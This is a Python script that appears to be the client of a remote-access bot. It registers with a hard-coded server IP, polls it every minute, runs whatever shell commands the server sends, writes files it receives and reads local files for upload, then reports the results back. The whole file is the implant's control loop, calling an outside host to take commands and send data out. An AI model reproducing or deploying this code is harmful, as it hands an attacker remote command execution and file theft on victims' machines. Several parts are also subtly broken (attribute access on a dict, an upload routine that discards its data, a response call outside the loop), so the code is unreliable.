import json
import time
import requests
import subprocess
import base64

url = "http://147.46.114.22:6666" #TODO : put server ip in here.

def send_register(server):
    r = requests.get(server+"/register")
    diction = r.json()
    if diction.get('error')!=None :
            send_register(server)
    return diction.get('id')

def send_request(id,server):
    id_dict={}
    id_dict["id"] = id
    r=requests.post(server+"/request",json=id_dict)
    result= r.json()
    return result

def send_response(id,server,cmd,response="",error=None):
    if response!="":
        cmd['response']=response

    if error!=None:
        cmd['error']=error

    cmd['id']=id
    requests.post(server+"/response",json=cmd)

def cmd_run(args):
    result = subprocess.run(args, stdout=subprocess.PIPE)
    if result.returncode != 0:
        return (result.stdout, "return code: {}".format(result.returncode))
    return (result.stdout, None)

def cmd_dl(args):
    (path, data) = args
    data = base64.b64decode(data)
    try:
        outfile = open(path, 'wb')
        outfile.write(data)
        outfile.close()
    except Exception as e:
        return ('FAILED', str(e))
    return ('OK', None)

def cmd_ul(args):
    path = args[0]
    try:
        infile = open(path, 'rb')
        data = infile.read()
        data.close()
        base64.b64encode(data)
    except Exception as e:
        return ('FAILED', str(e))
    return ('OK', None)

if __name__=='__main__': #main will executed every 1 minutes
    id=send_register(url)
    print(id)
    cmd=send_request(id,url)
    print(cmd)
    send_response(id,url,cmd,response="OK")
    next_time=time.time() #time will be 1 minute
    while(True):
        cur = time.time()
        if cur < next_time:
            time.sleep(next_time-cur)
        next_time = cur + 60

        req_result=send_request(id,url)
        print(req_result)
        for cmd in req_result:
            type=cmd.get('type')
            if type=='run' :
                (response, error) = cmd_run(cmd.args)

            elif type=='download':
                (response, error) = cmd_dl(cmd.args)

            elif type=='upload':
                (response, error) = cmd_ul(cmd.args)

            else:
                print("ERROR/None")
                continue

        send_response(id, url, cmd, response, error)
